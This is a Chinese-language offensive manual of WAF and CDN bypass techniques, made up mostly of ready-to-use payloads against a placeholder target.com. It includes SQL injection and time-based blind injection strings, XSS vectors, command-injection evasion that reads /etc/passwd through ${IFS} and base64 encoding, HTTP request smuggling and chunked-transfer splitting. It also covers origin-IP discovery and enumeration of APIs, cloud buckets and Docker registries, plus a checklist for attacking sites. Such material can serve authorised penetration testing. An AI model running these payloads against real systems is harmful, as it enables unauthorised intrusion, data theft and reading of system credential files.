# 高级绕过技术库 2025 - 实战手册

## 🛡️ WAF绕过实战Payload库

### Cloudflare WAF绕过（2025最新）

#### SQL注入绕过
```sql
-- 方法1: Unicode编码
UNION\u0020SELECT\u00201,2,3

-- 方法2: 注释符绕过
UNION/**/SELECT/**/1,2,3
UNION/*!*/SELECT/*!*/1,2,3
UNION/*!50000*/SELECT/*!50000*/1,2,3

-- 方法3: 函数替换
SUBSTRING -> SUBSTR
CONCAT -> CHAR
ASCII -> ORD
```

#### XSS绕过
```javascript
// 方法1: Unicode编码
<script>\u0061lert(1)</script>

// 方法2: 事件处理器绕过
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

// 方法3: 编码绕过
<svg><script>alert&#40;1&#41;</script></svg>
```

#### 命令执行绕过
```bash
# 方法1: 变量替换
${IFS} 代替空格
${PATH:0:1} 代替 /
${HOME:0:1} 代替 ~

# 方法2: 编码绕过
echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d

# 方法3: 通配符
cat /etc/passwd
cat /???/passwd
cat /e??/p??swd
```

### AWS WAF绕过

#### 大小写混合
```sql
UnIoN SeLeCt 1,2,3 FrOm UsErS
```

#### 参数污染
```http
GET /page?id=1&id=1' OR 1=1-- HTTP/1.1
```

#### 双编码
```python
import urllib.parse
payload = "1' OR 1=1--"
double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
```

### Imperva绕过

#### Cookie注入
```http
Cookie: session=valid; id=1' OR 1=1--
```

#### Header污染
```http
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
```

### ModSecurity绕过

#### 换行符绕过
```sql
UNION
SELECT
1,2,3
FROM
users
```

#### Tab符绕过
```sql
UNION	SELECT	1,2,3
```

---

## 🌐 CDN绕过 - 真实IP挖掘完整技术

### 方法1: 历史DNS记录
```bash
# SecurityTrails (需要API)
curl "https://api.securitytrails.com/v1/history/$DOMAIN/dns/a" \
  -H "APIKEY: $API_KEY"

# ViewDNS
curl "https://viewdns.info/iphistory/?domain=$DOMAIN"

# DNS历史查询
dig @8.8.8.8 target.com ANY
```

### 方法2: 子域名IP关联
```bash
# 子域名可能未接入CDN
subfinder -d target.com -o subs.txt
for sub in $(cat subs.txt); do
    host $sub | grep "has address" | awk '{print $4}'
done | sort -u

# 分析IP段，找出真实IP
```

### 方法3: 邮件服务器
```bash
# MX记录通常不通过CDN
dig target.com MX
nslookup mail.target.com
nslookup smtp.target.com
```

### 方法4: SSL证书IP
```bash
# 证书透明度日志中查找IP
curl -s "https://crt.sh/?q=%25target.com&output=json" | \
    jq -r '.[] | .id' | while read id; do
    curl -s "https://crt.sh/?id=$id" | grep -oP '(?<=IP Address: )[0-9.]+'
done | sort -u
```

### 方法5: 国外节点探测
```bash
# 使用海外代理/VPS访问
# 可能绕过CDN，直接访问源站
curl --proxy socks5://proxy:1080 https://target.com

# 或使用多地VPS
# 美国、欧洲、日本节点分别访问
```

### 方法6: 特殊端口探测
```bash
# CDN通常只代理80/443
# 其他端口可能直接暴露源站
nmap -p 8000,8080,8443,9000 target.com
```

### 方法7: Fofa/Shodan搜索
```bash
# Fofa语法
title="target.com" && country="CN"
# 或
ip="1.2.3.4" && port="80"

# Shodan语法
hostname:target.com
```

---

## 🎯 攻击面扩展 - 深度挖掘

### 1. API端点发现

#### 方法1: JS文件分析
```bash
# 提取所有JS文件
curl -s https://target.com | grep -oP 'src="[^"]*\.js"' | \
    sed 's/src="//' | sed 's/"//' | while read js; do
    curl -s "https://target.com/$js" | grep -oP 'https?://[^"\' ]+/api/[^"\' ]+'
done

# 或使用工具
subjs -i alive.txt -o js_urls.txt
cat js_urls.txt | while read url; do
    curl -s "$url" | grep -oP '/api/[a-zA-Z0-9/_]+' | sort -u
done
```

#### 方法2: 目录扫描
```bash
# API常见路径
ffuf -w api_paths.txt -u https://target.com/FUZZ -mc 200

# api_paths.txt内容：
# /api
# /api/v1
# /api/v2
# /graphql
# /rest
# /swagger
# /api-docs
```

#### 方法3: GraphQL端点
```bash
# 常见路径
for path in graphql graphiql v1/graphql api/graphql; do
    curl -X POST "https://target.com/$path" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __schema { types { name } } }"}'
done
```

### 2. 云存储桶枚举

#### AWS S3
```bash
# 方法1: 直接访问
aws s3 ls s3://bucket-name/ --no-sign-request

# 方法2: 工具扫描
s3scanner scan bucket-name
bucket_finder -w wordlist.txt

# 方法3: 常见命名规则
# {company}-{env}
# {company}-backup
# {company}-logs
# {company}-assets
```

#### 阿里云OSS
```bash
# 未授权访问检测
ossutil ls oss://bucket-name --config-file config

# 或直接HTTP访问
curl http://bucket-name.oss-cn-hangzhou.aliyuncs.com/
```

#### 腾讯云COS
```bash
coscmd list -a
```

### 3. 测试环境发现

#### 常见命名规则
```bash
for env in dev test staging uat pre prod demo sandbox; do
    for prefix in "" "api-" "-api" "app-"; do
        echo "$prefix$env.target.com"
        echo "$env-$prefix.target.com"
    done
done | httpx -mc 200,403 -o test_envs.txt
```

#### 通过证书发现
```bash
# 证书透明度中的测试域名
curl -s "https://crt.sh/?q=%25target.com&output=json" | \
    jq -r '.[].name_value' | grep -iE "dev|test|staging|uat"
```

### 4. 第三方服务利用

#### CDN绕过
```bash
# Cloudflare真实IP
# 1. 历史DNS记录
# 2. 邮件服务器IP
# 3. 子域名IP关联
# 4. 国外节点访问

# CloudFront源站
# 通过CloudFront域名反查
```

#### 分析工具绕过
```bash
# Google Analytics ID
curl -s https://target.com | grep -oP 'UA-[0-9]+-[0-9]+'

# 可能泄露内部信息
```

### 5. 供应链攻击

#### NPM包
```bash
# 查找目标使用的NPM包
curl -s https://target.com | grep -oP 'node_modules/[^/]+' | sort -u

# 检查包漏洞
npm audit
```

#### Docker镜像
```bash
# 发现Docker Registry
curl https://target.com/v2/_catalog
curl https://target.com/v2/IMAGE_NAME/tags/list

# 未授权访问
docker pull target.com/IMAGE_NAME:TAG
```

---

## 🔥 最新绕过思路（2025创新）

### 1. HTTP/2 多路复用绕过
```bash
# HTTP/2特性利用
curl --http2 \
    -H "Host: target.com" \
    -H "X-Forwarded-For: 1.2.3.4" \
    "https://target.com/page?id=1' OR 1=1--"
```

### 2. 请求走私绕过
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 5

12345GET /admin HTTP/1.1
Host: target.com
```

### 3. 协议降级绕过
```bash
# HTTPS -> HTTP降级
# 某些WAF只检查HTTPS
curl http://target.com/page?id=1' OR 1=1--
```

### 4. 时间延迟绕过
```sql
-- 时间盲注绕过WAF
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)--
```

### 5. 分段传输绕过
```http
POST /page HTTP/1.1
Transfer-Encoding: chunked

5
id=1'
0

POST /page HTTP/1.1
Transfer-Encoding: chunked

3
 OR
0
```

---

## 📝 实战检查清单

### CDN绕过检查
- [ ] 历史DNS记录查询
- [ ] 子域名IP关联分析
- [ ] 邮件服务器IP
- [ ] SSL证书IP提取
- [ ] 国外节点探测
- [ ] 特殊端口扫描
- [ ] Fofa/Shodan搜索

### WAF绕过检查
- [ ] WAF类型识别（wafw00f）
- [ ] Unicode编码测试
- [ ] 注释符绕过
- [ ] 大小写混合
- [ ] 参数污染
- [ ] 请求走私
- [ ] HTTP/2多路复用
- [ ] 代理轮换

### 攻击面扩展检查
- [ ] 子域名枚举（多工具）
- [ ] API端点发现（JS分析）
- [ ] 云存储桶枚举
- [ ] 测试环境发现
- [ ] 第三方服务识别
- [ ] GitHub代码泄露
- [ ] 供应链组件分析

---

**最后更新：2025-11-05**
